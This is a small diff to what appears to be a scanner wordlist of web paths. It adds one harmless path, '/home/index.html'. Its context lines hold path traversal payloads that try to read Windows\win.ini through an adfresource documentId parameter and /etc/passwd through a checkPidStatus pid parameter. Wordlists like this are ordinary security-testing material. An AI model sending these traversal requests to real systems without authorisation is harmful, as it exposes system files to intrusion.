@@ -5,6 +5,7 @@
 /xmlpserver/servlet/adfresource?format=aaaaaaaaaaaaaaa&documentId=..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\Windows\win.ini
 /workspace/index.jsp
 /atlantis/login.php
+/home/index.html
 /global_admin.ini
 /API/process/checkPidStatus.php?pid=/../etc/passwd
 /API/process/checkPidStatus.php?pid=/../../etc/passwd
